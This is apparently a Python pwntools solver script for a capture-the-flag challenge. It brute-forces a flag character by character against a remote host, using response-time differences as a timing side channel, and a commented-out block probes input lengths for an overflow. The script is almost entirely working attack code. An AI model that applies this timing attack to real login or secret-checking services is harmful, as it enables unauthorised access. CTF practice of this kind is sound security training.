#! /usr/bin/env python
from pwn import *
import time
host = '40.76.33.15'
port = 31337


# for i in range(8, 100):
# 	f = remote(host, port)	
# 	print f.read()
# 	print f.read()
# 	f.sendline("A"*i)
# 	respond = f.read()
# 	if respond[:3]!='RIP':	
# 		print 'i='+str(i)
# 		break
# 	print '...'

# 	f.close()

l = 23-10-9-1
cur_t = 10+9
ans = 'b0ctf{ticky_t0cky_t'
for i in range(16):
	for c in '_}raeiou13kbcdfghjlmnpqstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ02456789':
		start = time.time()
		f = remote(host, port)	
		print f.read()
		print f.read()
		f.sendline(ans+c+'A'*l)
		respond = f.read()

		if respond[:3]!='WRO':	
			print respond
		print '...'
		t = time.time()-start
		if t-cur_t > 1:
			print t
			ans += c
			print ans
			l -= 1
			cur_t += 1
			break
                f.close()


print ans
